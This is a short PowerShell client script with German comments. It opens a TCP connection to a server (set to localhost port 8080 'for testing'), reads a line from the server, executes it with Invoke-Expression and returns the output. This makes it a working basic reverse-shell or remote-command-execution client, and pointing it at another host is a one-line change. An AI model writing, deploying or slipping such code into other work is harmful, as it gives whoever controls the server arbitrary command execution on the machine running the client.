# Client-Skript: Verbindet sich zum Server auf Port 8080
$serverAddress = "127.0.0.1"  # localhost für Testzwecke
$port = 8080                    # Der gleiche Port wie im Server-Skript

try {
    $client = New-Object System.Net.Sockets.TcpClient($serverAddress, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true

    # Nachricht an den Server senden
    $message = "Connected!"
    $writer.WriteLine($message)

    # Antwort vom Server lesen
    $response = $reader.ReadLine()
    try{
        if($response)
        {
            $result = Invoke-Expression $response
            $writer.WriteLine("$result")
        }
    } 
    catch
    {
        $writer.WriteLine("Fehler bei Client: $_")
    }
    

    # Schließe die Verbindung
    $client.Close()
} catch {
    Write-Output "Fehler bei der Verbindung: $_"
}